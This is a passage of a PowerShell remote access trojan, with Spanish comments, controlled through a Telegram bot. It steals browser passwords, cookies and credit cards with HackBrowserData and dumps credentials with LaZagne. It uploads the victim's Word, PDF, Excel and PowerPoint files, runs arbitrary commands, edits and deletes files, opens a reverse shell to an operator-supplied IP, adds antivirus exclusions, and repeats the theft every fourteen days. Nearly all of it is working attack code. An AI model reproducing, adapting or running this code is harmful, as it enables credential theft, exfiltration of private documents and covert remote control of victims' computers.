    try { $all += Extract-FirefoxPasswords } catch { Write-Log "Firefox native: $_" }

    if ($all.Count -gt 0) {
        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
        $jf = "$env:TEMP\passwords_$ts.json"
        $tf = "$env:TEMP\passwords_$ts.txt"
        ($all | ConvertTo-Json -Depth 4) | Out-File $jf -Encoding UTF8
        ($all | ForEach-Object { "URL: $($_.URL)`nUSER: $($_.User)`nPASS: $($_.Password)`n---" }) -join "`n" | Out-File $tf -Encoding UTF8
        $zip = "$env:TEMP\passwords_$ts.zip"
        Compress-Archive -Path $jf,$tf -DestinationPath $zip -Force
        Send-File -Path $zip -Caption "PASSWORDS: $($all.Count) cuentas - $env:COMPUTERNAME"
        Remove-Item $jf,$tf,$zip -Force -ErrorAction SilentlyContinue
    } else {
        Send-Message -Text "Extraccion nativa sin resultados. Probando HackBrowserData..."
    }

    # Respaldo con HackBrowserData (todos los tipos)
    if (Test-Path $HackPath) {
        Stop-Browsers; Start-Sleep -Seconds 2
        $o = "$env:TEMP\pw_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
        New-Item -ItemType Directory -Path $o -Force | Out-Null
        try {
            $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$o`" -f json" -PassThru -WindowStyle Hidden
            $p.WaitForExit(180000); if (-not $p.HasExited) { $p.Kill() }
            Start-Sleep -Seconds 2
            $pf = Get-ChildItem $o -Recurse -Filter "*password*" -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($pf) {
                $z = "$env:TEMP\hbd_passwords.zip"
                Compress-Archive -Path $pf.FullName -DestinationPath $z -Force
                Send-File -Path $z -Caption "Passwords (HackBrowserData) - $env:COMPUTERNAME"
                Remove-Item $z -Force -ErrorAction SilentlyContinue
            }
        } finally { Remove-Item $o -Recurse -Force -ErrorAction SilentlyContinue }
    }
    Send-Message -Text "Extraccion de passwords finalizada."
}

# === FASE 1: HACKBROWSERDATA ===
function Run-HackBrowserData-Phase {
    if (-not (Test-Path $HackPath)) { Send-Message -Text "Error: hackbrowserdata.exe no encontrado"; return $false }
    Send-Message -Text "=== FASE 1: HackBrowserData ==="
    $intentos = 0; $max = 5
    while ($script:ArchivosHBDEnviados -lt 8 -and $intentos -lt $max) {
        $intentos++
        Stop-Browsers; Start-Sleep -Seconds 3
        $outDir = "$env:TEMP\hbd_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$intentos"
        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
        try {
            $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outDir`" -f json" -PassThru -WindowStyle Hidden
            $p.WaitForExit(180000); if (-not $p.HasExited) { $p.Kill() }
            Start-Sleep -Seconds 2
            $tipos = @{ "bookmarks"="bookmark";"cookies"="cookie";"downloads"="download";"extensions"="extension";"history"="history";"localstorage"="localstorage";"passwords"="password";"creditcards"="creditcard" }
            $all = Get-ChildItem $outDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
            if ($all) {
                $tempDirs = @{}; $porTipo = @{}
                foreach ($t in $tipos.Keys) { $d = "$env:TEMP\hbd_tipo_$t"; New-Item -ItemType Directory -Path $d -Force | Out-Null; $tempDirs[$t]=$d; $porTipo[$t]=@() }
                foreach ($file in $all) {
                    $m = $false
                    foreach ($t in $tipos.Keys) { if ($file.Name -like "*$t*") { Copy-Item $file.FullName -Destination $tempDirs[$t] -Force; $porTipo[$t]+=$file; $m=$true; break } }
                    if (-not $m) { Copy-Item $file.FullName -Destination $tempDirs["localstorage"] -Force; $porTipo["localstorage"]+=$file }
                }
                $idx = 0
                foreach ($t in $tipos.Keys) {
                    $idx++; $nombreZip = $tipos[$t]; $zipPath = "$env:TEMP\$nombreZip.zip"
                    if ($porTipo[$t].Count -gt 0) {
                        Compress-Archive -Path "$($tempDirs[$t])\*" -DestinationPath $zipPath -Force
                        $mb = [math]::Round((Get-Item $zipPath).Length/1MB,2)
                        if (Send-File -Path $zipPath -Caption "[$idx/8] [$nombreZip.zip] HBD`nArchivos: $($porTipo[$t].Count)`n$mb MB`n$env:COMPUTERNAME") { $script:ArchivosHBDEnviados++ }
                    } else {
                        $info = "$env:TEMP\info_hbd_$t.txt"; "Sin datos - $env:COMPUTERNAME" | Out-File $info -Encoding UTF8
                        Compress-Archive -Path $info -DestinationPath $zipPath -Force; Remove-Item $info -Force -ErrorAction SilentlyContinue
                        if (Send-File -Path $zipPath -Caption "[$idx/8] [$nombreZip.zip] Sin datos") { $script:ArchivosHBDEnviados++ }
                    }
                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2
                }
                foreach ($d in $tempDirs.Values) { Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue }
            } else {
                $nombres = @("bookmark","cookie","download","extension","history","localstorage","password","creditcard")
                for ($i=0; $i -lt 8; $i++) {
                    $z = "$env:TEMP\$($nombres[$i]).zip"; $info = "$env:TEMP\i_$i.txt"
                    "Sin datos - $env:COMPUTERNAME" | Out-File $info -Encoding UTF8
                    Compress-Archive -Path $info -DestinationPath $z -Force; Remove-Item $info -Force -ErrorAction SilentlyContinue
                    if (Send-File -Path $z -Caption "[$($i+1)/8] [$($nombres[$i]).zip] Sin datos") { $script:ArchivosHBDEnviados++ }
                    Remove-Item $z -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2
                }
            }
        } finally { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
        if ($script:ArchivosHBDEnviados -lt 8) { Send-Message -Text "HBD: faltan $((8-$script:ArchivosHBDEnviados)). Reintentando..."; Start-Sleep -Seconds 5 }
    }
    if ($script:ArchivosHBDEnviados -ge 8) { $script:HackBrowserDataCompleted = $true; Save-State; Send-Message -Text "FASE 1 COMPLETADA: 8 archivos"; return $true }
    Send-Message -Text "FASE 1 INCOMPLETA: $($script:ArchivosHBDEnviados)/8"; return $false
}

# === FASE 2: LAZAGNE ===
function Run-LaZagne-Phase {
    if (-not (Test-Path $LaZagnePath)) { Send-Message -Text "Error: lazagne.exe no encontrado"; return $false }
    Send-Message -Text "=== FASE 2: LaZagne ==="
    $outDir = "$env:TEMP\lazagne_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
    $modulos = @("browsers","chats","databases","games","git","mails","maven","memory","multimedia","php","svn","sysadmin","windows","wifi","unused")
    $ok = 0; $conDatos = 0
    for ($i=0; $i -lt $modulos.Count; $i++) {
        $m = $modulos[$i]; $num = $i+1
        try {
            $of = "$outDir\lazagne_$m.txt"
            $p = Start-Process -FilePath $LaZagnePath -ArgumentList $m -RedirectStandardOutput $of -RedirectStandardError "$outDir\err_$m.txt" -PassThru -WindowStyle Hidden
            $p.WaitForExit(90000); if (-not $p.HasExited) { $p.Kill() }
            Start-Sleep -Seconds 2
            if (Test-Path $of) {
                $c = Get-Content $of -Raw -ErrorAction SilentlyContinue
                $tiene = $c -match "Password found|password found|\[\+\]" -and ($c.Length -gt 200)
                if ($tiene) { $conDatos++ }
                $z = "$env:TEMP\lazagne_$m.zip"; Compress-Archive -Path $of -DestinationPath $z -Force
                $estado = if ($tiene) { "CON DATOS" } else { "sin datos" }
                if (Send-File -Path $z -Caption "[$num/$($modulos.Count)] [LaZagne] $m`nEstado: $estado") { $ok++ }
                Remove-Item $z -Force -ErrorAction SilentlyContinue
            }
        } catch { Write-Log "Error modulo $m : $_" }
        Start-Sleep -Seconds 2
    }
    Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue
    $script:LaZagneCompleted = $true; Save-State
    Send-Message -Text "FASE 2 COMPLETADA: $conDatos/$($modulos.Count) con datos"
    return $true
}

# === FASE 3: DOCUMENTOS ===
function Exfiltrate-Documents {
    Send-Message -Text "=== FASE 3: Documentos ==="
    $doc = [Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)
    try { $descargas = (New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path } catch { $descargas = "" }
    $carpetas = @(); if (Test-Path $doc) { $carpetas += $doc }; if ($descargas -and (Test-Path $descargas)) { $carpetas += $descargas }
    if ($carpetas.Count -eq 0) { Send-Message -Text "Sin carpetas"; $script:FilesExfiltrated=$true; Save-State; return }
    $tipos = @{
        WORD=@('*.doc','*.docx','*.docm','*.rtf','*.odt'); PDF=@('*.pdf')
        EXCEL=@('*.xls','*.xlsx','*.xlsm','*.xlsb','*.csv','*.ods'); POWERPOINT=@('*.ppt','*.pptx','*.pptm','*.pps','*.ppsx','*.odp')
    }
    $col = @{}; foreach ($t in $tipos.Keys) { $col[$t]=@() }
    foreach ($c in $carpetas) { foreach ($t in $tipos.Keys) { try { $col[$t] += Get-ChildItem -Path $c -Include $tipos[$t] -Recurse -File -ErrorAction SilentlyContinue } catch {} } }
    $total = 0; foreach ($t in $col.Keys) { $total += $col[$t].Count }
    if ($total -eq 0) { Send-Message -Text "Sin documentos"; $script:FilesExfiltrated=$true; Save-State; return }
    Send-Message -Text "Total: $total"
    $n = 0
    foreach ($t in @("WORD","PDF","EXCEL","POWERPOINT")) {
        if ($col[$t].Count -gt 0) {
            Send-Message -Text "=== $t ==="
            foreach ($a in $col[$t] | Sort-Object FullName) {
                $n++; $mb = [math]::Round($a.Length/1MB,2)
                Send-File -Path $a.FullName -Caption "[$n/$total] [$t] $($a.Name)`n$mb MB`n$($a.DirectoryName)" | Out-Null
                Start-Sleep -Seconds 2
            }
        }
    }
    $script:FilesExfiltrated = $true; Save-State; Send-Message -Text "FASE 3 COMPLETADA"
}

# === EJECUTAR COMANDO CMD (salida a .txt) ===
function Run-Command {
    param([string]$Cmd)
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"; $psi.Arguments = "/c $Cmd"
        $psi.WorkingDirectory = $script:CurrentDir
        $psi.RedirectStandardOutput = $true; $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false; $psi.CreateNoWindow = $true
        $proc = [System.Diagnostics.Process]::Start($psi)
        $out = $proc.StandardOutput.ReadToEnd(); $err = $proc.StandardError.ReadToEnd(); $proc.WaitForExit()
        $output = ($out + $err).Trim(); if ([string]::IsNullOrWhiteSpace($output)) { $output = "(sin salida)" }
        $temp = "$env:TEMP\cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        "Comando: $Cmd`nDir: $script:CurrentDir`n$('='*50)`n$output" | Out-File $temp -Encoding UTF8
        Send-File -Path $temp -Caption "Salida: $Cmd"; Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch { Send-Message -Text "Error: $($_.Exception.Message)" }
}

# === NAVEGACION / EDICION ===
function Get-PathFull {
    param([string]$p)
    if ([string]::IsNullOrWhiteSpace($p)) { return $script:CurrentDir }
    if ([System.IO.Path]::IsPathRooted($p)) { return $p }
    return (Join-Path $script:CurrentDir $p)
}

function Cmd-Ls {
    param([string]$p)
    try {
        $full = Get-PathFull $p
        $items = Get-ChildItem $full -Force -ErrorAction Stop |
                 Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String -Width 200
        $temp = "$env:TEMP\ls_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        "Dir: $full`n$('='*50)`n$items" | Out-File $temp -Encoding UTF8
        Send-File -Path $temp -Caption "LS: $full"; Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch { Send-Message -Text "Error: $($_.Exception.Message)" }
}
function Cmd-Cd { param([string]$p); $full = Get-PathFull $p; if (Test-Path $full -PathType Container) { $script:CurrentDir = (Resolve-Path $full).Path; Send-Message -Text "Dir: $script:CurrentDir" } else { Send-Message -Text "No existe: $full" } }
function Cmd-Cat { param([string]$p); try { $full = Get-PathFull $p; if (-not (Test-Path $full)) { Send-Message -Text "No existe: $full"; return }; $c = Get-Content $full -Raw -ErrorAction Stop; if ($c.Length -gt 3800) { $c = $c.Substring(0,3800)+"`n...(truncado)" }; Send-Message -Text "$full`n`n$c" } catch { Send-Message -Text "Error: $($_.Exception.Message)" } }
function Cmd-Delete { param([string]$p); try { $full = Get-PathFull $p; Remove-Item $full -Recurse -Force -ErrorAction Stop; Send-Message -Text "Borrado: $full" } catch { Send-Message -Text "Error: $($_.Exception.Message)" } }
function Cmd-Mkdir { param([string]$p); try { $full = Get-PathFull $p; New-Item -ItemType Directory -Path $full -Force | Out-Null; Send-Message -Text "Creado: $full" } catch { Send-Message -Text "Error: $($_.Exception.Message)" } }
function Cmd-Move { param([string]$a); $pp = $a -split '\s+',2; if ($pp.Count -lt 2) { Send-Message -Text "Uso: /mv origen destino"; return }; try { Move-Item (Get-PathFull $pp[0]) (Get-PathFull $pp[1]) -Force; Send-Message -Text "Movido." } catch { Send-Message -Text "Error: $($_.Exception.Message)" } }
function Cmd-Copy { param([string]$a); $pp = $a -split '\s+',2; if ($pp.Count -lt 2) { Send-Message -Text "Uso: /cp origen destino"; return }; try { Copy-Item (Get-PathFull $pp[0]) (Get-PathFull $pp[1]) -Recurse -Force; Send-Message -Text "Copiado." } catch { Send-Message -Text "Error: $($_.Exception.Message)" } }
function Cmd-Write { param([string]$a); $pp = $a -split '\s+',2; if ($pp.Count -lt 2) { Send-Message -Text "Uso: /write archivo contenido"; return }; try { $pp[1] | Out-File (Get-PathFull $pp[0]) -Encoding UTF8 -Append; Send-Message -Text "Escrito en $($pp[0])" } catch { Send-Message -Text "Error: $($_.Exception.Message)" } }

function Cmd-Download {
    param([string]$p)
    try {
        $full = Get-PathFull $p
        if (-not (Test-Path $full)) { Send-Message -Text "No existe: $full"; return }
        if ((Get-Item $full).PSIsContainer) {
            $zip = "$env:TEMP\dl_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
            Compress-Archive -Path "$full\*" -DestinationPath $zip -Force
            Send-File -Path $zip -Caption "Carpeta: $full"; Remove-Item $zip -Force -ErrorAction SilentlyContinue
        } else { Send-File -Path $full -Caption "Archivo: $full" }
    } catch { Send-Message -Text "Error: $($_.Exception.Message)" }
}

# === EDITAR ARCHIVO (envia -> modificas -> reenvias -> sobrescribe) ===
function Cmd-Edit {
    param([string]$p)
    try {
        $full = Get-PathFull $p
        if (-not (Test-Path $full)) { Send-Message -Text "No existe: $full"; return }
        if ((Get-Item $full).PSIsContainer) { Send-Message -Text "Es una carpeta, usa /download"; return }
        $nombre = Split-Path $full -Leaf
        $script:EditFiles[$nombre.ToLower()] = $full
        Save-State
        Send-File -Path $full -Caption "EDITAR -> $nombre`nRuta original: $full`n`nModifica el archivo y reenvialo aqui con el MISMO nombre. Se sobrescribira en su carpeta original."
        Send-Message -Text "Esperando '$nombre' modificado..."
    } catch { Send-Message -Text "Error: $($_.Exception.Message)" }
}

# === RECIBIR ARCHIVOS DESDE TELEGRAM ===
function Handle-IncomingFile {
    param($Message)
    try {
        $doc = $Message.document
        if (-not $doc) { $doc = $Message.photo | Select-Object -Last 1 }
        if (-not $doc) { return }
        $fileId = $doc.file_id
        $fileName = if ($doc.file_name) { $doc.file_name } else { "photo_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg" }
        $r = Invoke-RestMethod -Uri "$ApiUrl/getFile?file_id=$fileId" -TimeoutSec 30
        if (-not $r.ok) { Send-Message -Text "No se pudo obtener el archivo"; return }
        $url = "$ApiFile/$($r.result.file_path)"

        $key = $fileName.ToLower()
        if ($script:EditFiles.ContainsKey($key)) {
            $destino = $script:EditFiles[$key]
            $dir = Split-Path $destino -Parent
            if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
            # Sobrescritura real del archivo original
            Invoke-WebRequest -Uri $url -OutFile $destino -TimeoutSec 300
            $script:EditFiles.Remove($key); Save-State
            $mb = [math]::Round((Get-Item $destino).Length/1MB,2)
            Send-Message -Text "EDITADO y sobrescrito:`n$destino`n$mb MB"
            return
        }

        $dest = Join-Path $UploadDir $fileName
        Invoke-WebRequest -Uri $url -OutFile $dest -TimeoutSec 300
        $mb = [math]::Round((Get-Item $dest).Length/1MB,2)
        Send-Message -Text "Archivo guardado:`n$dest`n$mb MB"
    } catch { Send-Message -Text "Error recibiendo archivo: $($_.Exception.Message)" }
}

# === REVERSE SHELL ===
function Start-ReverseShell {
    param([string]$IPAddress, [int]$Port = 4444)
    try {
        Send-Message -Text "Conectando a $IPAddress`:$Port ..."
        $script:ReverseShellActive = $true
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        $script:ShellClient = $client
        $stream = $client.GetStream(); $script:ShellStream = $stream
        $writer = New-Object System.IO.StreamWriter($stream); $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        $writer.WriteLine("=== Shell: $env:USERNAME@$env:COMPUTERNAME ===")
        while ($script:ReverseShellActive -and $client.Connected) {
            $writer.Write("PS $(Get-Location)> ")
            $command = $reader.ReadLine()
            if ($command -eq "exit") { break }
            if (-not [string]::IsNullOrWhiteSpace($command)) {
                try { $writer.WriteLine((Invoke-Expression $command 2>&1 | Out-String)) } catch { $writer.WriteLine("Error: $_") }
            }
        }
    } catch { Send-Message -Text "Error shell: $_" }
    finally {
        if ($script:ShellStream) { $script:ShellStream.Close() }
        if ($script:ShellClient) { $script:ShellClient.Close() }
        $script:ReverseShellActive = $false
        Send-Message -Text "Shell desconectado."
    }
}

# === ESTADO ===
function Save-State {
    $s = @{
        LastStealTime = if ($script:LastStealTime) { $script:LastStealTime.ToString("o") } else { $null }
        FilesExfiltrated = $script:FilesExfiltrated
        HackBrowserDataCompleted = $script:HackBrowserDataCompleted
        LaZagneCompleted = $script:LaZagneCompleted
        ArchivosHBDEnviados = $script:ArchivosHBDEnviados
        PwAutoDone = $script:PwAutoDone
        EditFiles = @($script:EditFiles.GetEnumerator() | ForEach-Object { @{ name = $_.Key; path = $_.Value } })
    }
    $s | ConvertTo-Json -Depth 5 | Out-File $StateFile -Encoding UTF8
}
function Load-State {
    if (Test-Path $StateFile) {
        try {
            $s = Get-Content $StateFile | ConvertFrom-Json
            if ($s.LastStealTime) { $script:LastStealTime = [DateTime]::Parse($s.LastStealTime) }
            if ($s.FilesExfiltrated -ne $null) { $script:FilesExfiltrated = $s.FilesExfiltrated }
            if ($s.HackBrowserDataCompleted -ne $null) { $script:HackBrowserDataCompleted = $s.HackBrowserDataCompleted }
            if ($s.LaZagneCompleted -ne $null) { $script:LaZagneCompleted = $s.LaZagneCompleted }
            if ($s.ArchivosHBDEnviados -ne $null) { $script:ArchivosHBDEnviados = $s.ArchivosHBDEnviados }
            if ($s.PwAutoDone -ne $null) { $script:PwAutoDone = $s.PwAutoDone }
            if ($s.EditFiles) { foreach ($e in $s.EditFiles) { $script:EditFiles[$e.name] = $e.path } }
        } catch {}
    }
}

# === FLUJO AUTOMATICO ===
function Check-AutoSteal {
    $now = Get-Date
    if ($script:LastStealTime -and ($now - $script:LastStealTime).Days -ge 14) {
        Send-Message -Text "Reiniciando ciclo completo (14 dias)"
        $script:HackBrowserDataCompleted=$false; $script:LaZagneCompleted=$false
        $script:FilesExfiltrated=$false; $script:ArchivosHBDEnviados=0; $script:LastStealTime=$null; Save-State
    }
    if (-not $script:HackBrowserDataCompleted) { if (-not (Run-HackBrowserData-Phase)) { return } }
    if ($script:HackBrowserDataCompleted -and -not $script:LaZagneCompleted) { Run-LaZagne-Phase }
    if ($script:HackBrowserDataCompleted -and $script:LaZagneCompleted -and -not $script:FilesExfiltrated) {
        Exfiltrate-Documents
        if ($script:FilesExfiltrated) { $script:LastStealTime = Get-Date; Save-State; Send-Message -Text "CICLO COMPLETO - proximo en 14 dias" }
    }
}

# === MENU (sin botones de pausa/reanudar/cancelar) ===
function Send-Menu {
    $kb = @{
        inline_keyboard = @(
            @( @{text="Captura";callback_data="/captura"}, @{text="Info";callback_data="/info"} ),
            @( @{text="Passwords";callback_data="/passwords"}, @{text="Documentos";callback_data="/files"} ),
            @( @{text="HBD";callback_data="/hack"}, @{text="LaZagne";callback_data="/lazagne"} ),
            @( @{text="PWD";callback_data="/pwd"}, @{text="LS";callback_data="/ls"} ),
            @( @{text="Ciclo";callback_data="/steal"}, @{text="Actualizar";callback_data="/update"} )
        )
    }
    Send-Message-Buttons -Text "Menu - usa botones o escribe comandos manuales" -Keyboard $kb
}

# === PROCESAR COMANDOS ===
function Process-Cmd {
    param([string]$Text, [int]$UpdateId)
    [void][System.Threading.Monitor]::Enter($script:Lock)
    try {
        if ($script:ProcessedUpdates.ContainsKey($UpdateId)) { return }
        $script:ProcessedUpdates[$UpdateId] = $true
        if ($script:ProcessedUpdates.Count -gt 200) {
            $keys = $script:ProcessedUpdates.Keys | Sort-Object | Select-Object -First 100
            foreach ($k in $keys) { $script:ProcessedUpdates.Remove($k) }
        }
    } finally { [System.Threading.Monitor]::Exit($script:Lock) }

    $parts = $Text.Trim() -split '\s+', 2
    $cmd   = $parts[0].ToLower()
    $cmdArgs = if ($parts.Count -gt 1) { $parts[1] } else { "" }
    Write-Log "Comando: $Text"

    switch ($cmd) {
        "/start"    { Send-Message -Text (Get-Info); Send-Menu }
        "/menu"     { Send-Menu }
        "/help"     { Send-Message -Text @"
COMANDOS:
INFO: /info /pwd /ls [ruta] /dir [ruta] /cd <ruta> /cat <archivo> /status
ACCIONES: /captura /cmd <comando> /run <exe> [args]
ARCHIVOS: /mkdir /md <carpeta> /rm /mv <o> <d> /cp <o> <d> /write <f> <txt>
EDITAR: /edit <archivo>  (te lo mando, lo modificas, lo reenvias y se sobrescribe)
TRANSFERIR: /download <ruta>
EXTRACCION: /steal /hack /lazagne /files /passwords
CONTROL MANUAL: /pause /resume /cancelar
OTROS: /update /shell <ip> [puerto] /stopshell /menu
"@ }
        "/info"     { Send-Message -Text (Get-Info) }
        "/status"   { Send-Message -Text "Dir: $script:CurrentDir`nPausado: $($script:SendPaused)`nCancelado: $($script:SendCancelled)`nCola: $($script:FileQueue.Count)`nShell: $($script:ReverseShellActive)`nPasswords auto: $($script:PwAutoDone)" }
        "/pwd"      { Send-Message -Text "Dir: $script:CurrentDir" }
        "/ls"       { Cmd-Ls $cmdArgs }
        "/dir"      { Cmd-Ls $cmdArgs }
        "/cd"       { Cmd-Cd $cmdArgs }
        "/cat"      { Cmd-Cat $cmdArgs }
        "/rm"       { Cmd-Delete $cmdArgs }
        "/mkdir"    { Cmd-Mkdir $cmdArgs }
        "/md"       { Cmd-Mkdir $cmdArgs }
        "/mv"       { Cmd-Move $cmdArgs }
        "/cp"       { Cmd-Copy $cmdArgs }
        "/write"    { Cmd-Write $cmdArgs }
        "/download" { Cmd-Download $cmdArgs }
        "/edit"     { if ($cmdArgs) { Cmd-Edit $cmdArgs } else { Send-Message -Text "Uso: /edit <archivo>" } }
        "/cmd"      { if ($cmdArgs) { Run-Command $cmdArgs } else { Send-Message -Text "Uso: /cmd <comando>" } }
        "/run"      {
            $pa = $cmdArgs -split '\s+', 2
            $exe = $pa[0]; $exeArgs = if ($pa.Count -gt 1) { $pa[1] } else { "" }
            if ($exe) { Invoke-ExeInRam -Path (Get-PathFull $exe) -Arguments $exeArgs } else { Send-Message -Text "Uso: /run <exe> [args]" }
        }
        "/update"   { Update-Bot }
        "/captura"  { Send-Message -Text "Capturando..."; Take-Screenshot | Out-Null }
        "/steal"    { $script:HackBrowserDataCompleted=$false; $script:LaZagneCompleted=$false; $script:FilesExfiltrated=$false; $script:ArchivosHBDEnviados=0; $script:SendCancelled=$false; Check-AutoSteal }
        "/hack"     { $script:ArchivosHBDEnviados=0; $script:HackBrowserDataCompleted=$false; Run-HackBrowserData-Phase }
        "/lazagne"  { $script:LaZagneCompleted=$false; Run-LaZagne-Phase }
        "/files"    { $script:FilesExfiltrated=$false; Exfiltrate-Documents }
        "/passwords" { Run-Passwords }

        # --- CONTROL MANUAL (sin botones) ---
        "/pause"    { $script:SendPaused = $true;  Send-Message -Text "Envio PAUSADO (manual). Los archivos van a la cola. Usa /resume para continuar." }
        "/resume"   { $script:SendPaused = $false; $script:SendCancelled = $false; Flush-FileQueue }
        "/cancelar" { $script:SendPaused = $false; $script:SendCancelled = $true; $script:FileQueue.Clear(); Send-Message -Text "Envio CANCELADO (manual). Cola vaciada." }

        "/shell"    {
            if ($script:ReverseShellActive) { Send-Message -Text "Ya hay shell activo."; return }
            $sa = $cmdArgs -split '\s+'
            $ip = $sa[0]; $port = if ($sa.Count -gt 1) { [int]$sa[1] } else { 4444 }
            if (-not $ip) { Send-Message -Text "Uso: /shell <IP> [puerto]"; return }
            Start-Job -ScriptBlock ${function:Start-ReverseShell} -ArgumentList $ip, $port | Out-Null
        }
        "/stopshell" {
            $script:ReverseShellActive = $false
            if ($script:ShellStream) { $script:ShellStream.Close() }
            if ($script:ShellClient) { $script:ShellClient.Close() }
            Send-Message -Text "Shell detenido."
        }
        default { Write-Log "Comando desconocido: $cmd" }
    }
}

# === INICIO ===
Write-Log "=== BOT INICIADO ==="
Add-AvExclusions
Load-State
Send-Message -Text "Bot online - $(Get-Info)"
Send-Menu

$script:PwPending = -not $script:PwAutoDone
if ($script:PwPending) { Send-Message -Text "Extraccion automatica de passwords pendiente (primer arranque)." }

try { Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null; Start-Sleep -Seconds 2 } catch {}

$lastId = 0
$ultimoCheck = Get-Date
while ($true) {
    try {
        if ($script:PwPending -and -not $script:PwAutoDone) {
            if (Test-BrowsersOpen) {
                if (-not $script:PwWaitNotified) {
                    Send-Message -Text "Hay navegadores abiertos. Esperando a que los cierres para extraer passwords..."
                    $script:PwWaitNotified = $true
                }
            } else {
                Start-Sleep -Seconds 2
                Run-Passwords
                $script:PwAutoDone = $true; $script:PwPending = $false; Save-State
                Send-Message -Text "Passwords extraidas automaticamente. Iniciando ciclo normal..."
                Check-AutoSteal
            }
        }

        $resp = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId+1)&timeout=25" -TimeoutSec 60
        if ($resp.ok -and $resp.result.Count -gt 0) {
            foreach ($upd in $resp.result) {
                $lastId = $upd.update_id
                if ($upd.callback_query) {
                    Answer-Callback -Id $upd.callback_query.id
                    if ([string]$upd.callback_query.message.chat.id -eq $ChatId) { Process-Cmd -Text $upd.callback_query.data -UpdateId $upd.update_id }
                    continue
                }
                if ($upd.message -and ([string]$upd.message.chat.id -eq $ChatId)) {
                    if ($upd.message.text) { Process-Cmd -Text $upd.message.text -UpdateId $upd.update_id }
                    elseif ($upd.message.document -or $upd.message.photo) { Handle-IncomingFile -Message $upd.message }
                }
            }
        }

        if (((Get-Date) - $ultimoCheck).TotalMinutes -ge 60) { $ultimoCheck = Get-Date; if ($script:PwAutoDone) { Check-AutoSteal } }
    } catch {
        $e = $_.Exception.Message
        if ($e -notlike "*409*") { Write-Log "Error loop: $e" }
        Start-Sleep -Seconds 2
    }
    Start-Sleep -Milliseconds 500
}
